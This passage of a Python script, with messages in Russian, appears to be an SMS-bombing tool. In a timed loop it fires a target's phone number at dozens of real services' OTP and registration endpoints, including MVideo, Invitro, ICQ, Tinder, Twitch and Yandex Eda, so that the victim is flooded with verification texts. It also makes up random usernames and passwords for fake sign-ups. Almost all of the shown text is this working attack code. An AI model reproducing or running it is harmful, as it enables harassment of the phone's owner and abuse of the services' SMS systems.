                'https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9 + '&country_code=%2B7&nod=4&locale=en')
            R = R + 1
            print('[+] oyorooms Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post(
                'https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp',
                params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false',
                        'fromRegisterPage': 'true', 'snLogin': '', 'bpg': '', 'snProviderId': ''},
                data={'phone': _phone, 'g-recaptcha-response': '', 'recaptcha': 'on'})
            R = R + 1
            print('[+] MVideo Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
                'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone, 'typeKeys': ['Unemployed']}},
                                                              'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
            R = R + 1
            print('[+] newnext Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            R = R + 1
            print('[+] Sunlight Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                          json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone,
                                'deliveryOption': 'sms'})
            R = R + 1
            print('[+] alpari Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
            R = R + 1
            print('[+] Invitro Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://online.sbis.ru/reg/service/',
                          json={'jsonrpc': '2.0', 'protocol': '5', 'method': 'Пользователь.ЗаявкаНаФизика',
                                'params': {'phone': _phone}, 'id': '1'})
            R = R + 1
            print('[+] Sberbank Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.carsmile.com/",
                          json={"operationName": "enterPhone", "variables": {"phone": _phone},
                                "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
            R = R + 1
            print('[+] carsmile Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            R = R + 1
            print('[+] Citilink Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.delitime.ru/api/v2/signup",
                          data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
            R = R + 1
            print('[+] Delitime Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')



        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                          data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            R = R + 1
            print('[+] ICQ Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
                          data={"mode": "request", "phone": "+" + _phone, "phone_permission": "unknown", "stream_id": 0,
                                "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
            R = R + 1
            print('[+] InDriver Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
                          data={"password": password, "application": "lkp", "login": "+" + _phone})
            R = R + 1
            print('[+] Invitro Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            R = R + 1
            print('[+] Pmsm Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
            R = R + 1
            print('[+] IVI Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',
                          json={'phone': '+' + self.formatted_phone})
            R = R + 1
            print('[+] Lenta Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                          json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email"})
            R = R + 1
            print('[+] Mail.ru Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                          params={"pageName": "registerPrivateUserPhoneVerificatio"},
                          data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
            R = R + 1
            print('[+] MVideo Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                          data={"st.r.phone": "+" + _phone})
            R = R + 1
            print('[+] OK Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
            R = R + 1
            print('[+] SMSgorod Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                          data={'phone_number': _phone})
            R = R + 1
            print('[+] Tinder Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true',
                          json={"birthday": {"day": 11, "month": 11, "year": 1999},
                                "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,
                                "password": password, "phone_number": _phone, "username": username})
            R = R + 1
            print('[+] Twitch Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
                          headers={'App-ID': 'cabinet'})
            R = R + 1
            print('[+] CabWiFi Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break

        try:
            requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
            R = R + 1
            print('[+] wowworks Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break

        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                          json={"phone_number": "+" + _phone})
            R = R + 1
            print('[+] Eda.Yandex Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')



        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break

        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                          json={"client_type": "personal", "email": f"{email}@gmail.ru", "mobile_phone": _phone,
                                "deliveryOption": "sms"})
            R = R + 1
            print('[+] Alpari Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
            R = R + 1
            print('[+] SMS Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
            R = R + 1
            print('[+] Delivery Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true',
                          json={"birthday": {"day": 11, "month": 11, "year": 1999},
                                "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,
                                "password": password, "phone_number": _phone, "username": username})
            R = R + 1
            print('[+] Twitch Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
                          headers={'App-ID': 'cabinet'})
            R = R + 1
            print('[+] CabWiFi Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
            R = R + 1
            print('[+] wowworks Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                          json={"phone_number": "+" + _phone})
            R = R + 1
            print('[+] Eda.Yandex Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                          json={"client_type": "personal", "email": f"{email}@gmail.ru", "mobile_phone": _phone,
                                "deliveryOption": "sms"})
            R = R + 1
            print('[+] Alpari Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
            R = R + 1
            print('[+] SMS Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')


    input()


    input()

_name = ''

for x in range(12):


    _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

    password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

    username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))



_phone9 = _phone[1:]

_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]

_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]

_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]

_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]

_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]







        


